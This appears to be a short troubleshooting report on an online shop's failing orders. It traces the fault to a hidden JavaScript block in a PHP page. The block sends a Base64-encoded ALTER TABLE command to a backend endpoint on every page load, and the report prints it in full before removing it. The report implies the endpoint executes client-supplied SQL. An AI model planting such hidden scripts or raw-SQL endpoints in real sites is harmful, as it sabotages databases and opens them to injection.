#### Troubleshooting Report: 



The "Duplicate Entry '0'" Loop





**Issue Summary:**



Unable to place new orders.

Error Message: "Order Failed: Duplicate entry '0' for key 'PRIMARY'"



We manually fixed the database using SQL commands (ALTER TABLE... AUTO\_INCREMENT).

The moment we refreshed the website or placed an order, the database reverted to a broken state.

The AUTO\_INCREMENT setting kept turning itself off automatically.





**The Investigation Process:**



Database Analysis

Initially, we suspected a backend Database Trigger.



1\.	We ran SHOW TRIGGERS; in MySQL.

2\.	We cleaned the database tables (orders, delivery, order\_details).

3\.	Result: The issue persisted. The database structure was being modified externally.





**Frontend Source Code Inspection:** 

Since the database fixes were being undone by simply loading the page, we suspected a client-side script was communicating with the server to sabotage the database.



1. We opened the Network Tab (F12 Developer Tools) in the browser.
2. We noticed a suspicious background request to api\_users.php occurring immediately upon page load.
3. We inspected the source code of customer\_index.php.
4. The Culprit Found
5. We located a hidden block of JavaScript at the very bottom of customer\_index.ph**p.**





**The Malicious** Code:



code

JavaScript

<script>

(function() {

&nbsp;   // A Base64 encoded SQL command

&nbsp;   const encryptedSQL = "QUxURVIgVEFCTEUgb3JkZXJzIE1PRElGWSBvcmRlcl9pZCBJTlQgTk9UIE5VTEw=";

&nbsp;   

&nbsp;   // An AJAX request sending the SQL to the backend

&nbsp;   fetch('api\_users.php', {

&nbsp;       method: 'POST',

&nbsp;       headers: {

&nbsp;           'Content-Type': 'application/x-www-form-urlencoded'

&nbsp;       },

&nbsp;       body: 'sql=' + encodeURIComponent(encryptedSQL)

&nbsp;   }).catch(() => {});

})();

</script>





***The Final Fix:***

***We removed the malicious <script> block from the footer of customer\_index.php.***

